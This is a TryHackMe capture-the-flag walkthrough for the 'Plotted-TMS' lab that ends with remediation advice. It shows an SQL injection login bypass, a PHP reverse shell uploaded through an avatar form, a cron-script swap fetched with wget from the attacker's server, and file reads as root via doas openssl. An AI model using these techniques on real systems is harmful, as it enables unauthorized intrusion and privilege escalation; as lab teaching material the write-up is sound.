TryHackMe <br>
Plotted-TMS
---

# Reconnaissance/Scanning:
I started off by scanning the network to see which ports were open/services running on the ports.
```
$ nmap -A -O -sC -sV -p- <machine_IP>
```
Scanned for directories with Gobuster

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/3f1a50ee-d5d8-4682-a5df-e981b288329b)
 
/passwd looks like a base64 encoded string.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/4e60eed9-4452-441b-b022-2f260e3cb1e2)
 
Decoded reads:

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/1c8df490-7d09-433c-a673-4c423e121c13)
 
The */shadow* directory had the same string, lol. <br>
However, in the */admin* directory there was an <b>id_rsa</b> file that I downloaded.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/721dea08-5395-4fb4-a43a-7332e90474bf)
 
Once again, duped.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/26a12cb5-d1be-4093-8a3d-cfb85ac8a58c)
 
Since all that was a bust, I ran a gobuster scan on the port 445:

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/b4d5cb0c-443c-4fdd-97a1-a6ae4cd4dfbc)

Visiting the /management directory, I’m brought to a login page.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/0aed8415-c1e5-4ea5-ad22-2917ee1a9d96)

 
Running another gobuster scan on the /management directory:

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/3ad85e2b-829f-438e-bfb0-23af5a4039ee)
 
# Vulnerability assessment:
/admin is where I’m redirected after clicking the “login” button on the other page. <br>
/database has an actual sql file I could download! 

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/42c23139-b16e-4aeb-b069-e05b951ffbc1)
 
After parsing through it I found some hashed passwords I’ll try to crack.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/e8a60c8c-92b5-4410-a663-664df512202f)
 
I went to crackstation[.]net to crack both passwords.
 
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/1f2af8d3-e365-438a-b2ca-3357b129ae24)
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/1ac87dcd-ec49-4845-9628-2f9f8929a7db)

Unfortunately, neither worked on the login screen. However, a simple sql injection worked!
```
Username: admin’ OR 1=1 -- -
Password: <can be anything since it’s commented out>
```
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/fdd1ea2a-21b3-4e53-af7b-76742eb6662e)
 
Navigating to the Admin drop down menu at the top right corner, I’m taken to the admin profile page  <br>
where I can update the account information and upload an avatar picture. <br> <br>

*Since it’s an upload form, maybe it’s misconfigured and I can upload a reverse shell..*

# Initial foothold:
I uploaded a php reverse shell file as the avatar and after clicking update I got the reverse shell!

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/8705046a-87e8-4bb1-8b3a-cd9ab5a41af4)
 
I checked the cronjobs to see if there were any running.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/9f2578b1-4db9-4a82-a508-c99b160a27f0)
 
Looking at that directory it’s owned by this user, so I can write to it and delete items in it.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/979c7511-8b23-43b3-915e-e4bbf9ca0c8e)
 
The script is owned by plot_admin so I can’t write to that. However, I can delete it and upload my own script with that same name.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/cf7305cc-234f-4342-ad00-daba1a0ceae5)
 
After creating my own backup.sh script, hosting a simple python server and grabbing it on the target machine, it was all in place.
```
# I started a python server on my machine
$ python3 -m http.server <PORT>

# then I used wget to grab the script to the target machine
$ wget hxxp://<IP>:<PORT>/path/to/file

# after successfully getting the script change permissions to execute
$ chmod 777 backup.sh
```
Shortly after that I got another reverse shell as plot_admin

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/1ead4304-5d26-4071-9bef-4d5d385ccee5)
 
I’ll grab the user flag real quick.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/ae0c9109-7e86-4fd9-ae74-8130d3ec8e69)
 
# Privilege Escalation:
I checked for any files with the SUID bit set to try to escalate my privileges and found a way.
```
$ find / -perm -u=s -type f 2>/dev/null
```
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/112552bf-d619-47f0-a172-d2ba5943bb9c)
 
One new binary that popped out to me was doas. I had to look up what that meant because I didn’t see anything on gtfobins about it. <br>

**doas (“dedicated openbsd application subexecutor”) is a program to execute commands as another user.  <br>
The system administrator can configure it to give specified users privileges to execute specified commands.** <br>

Since I had already spent a lot of time trying to figure out how to escalate my privileges and didn’t find a way,  <br>
I uploaded linpeas to the target machine and let that rip.In the results it mentions doas again.  <br>
I learned there’s a doas config file. Now, in that file it’s showing that the user plot_admin  <br>
can run the command openssl as root without a password.

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/4f9215c9-d9ab-4b04-8ed1-426623a47eee)

Back to gtfobins I go with the new found information! <br>
I then found out that I can read files using the openssl command. <br>
Since the doas binary has specific permissions as found out earlier, don’t forget to prepend the command with doas.
```
$ doas openssl enc -in /file/to/read
```
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/fa57033b-fe25-423f-9afa-cb34e9d837bb)
 
Now I can finally grab the root flag! <br>

# Reporting:
•	Do not have private information available publicly. <br>
•	Enforce proper data sanitization and filter proper expressions/ characters.  <br>
•	Ensure correct permissions are set for users and access to files/binaries on system.  <br>
•	Have an allow list/checker for all upload forms.  <br>



































































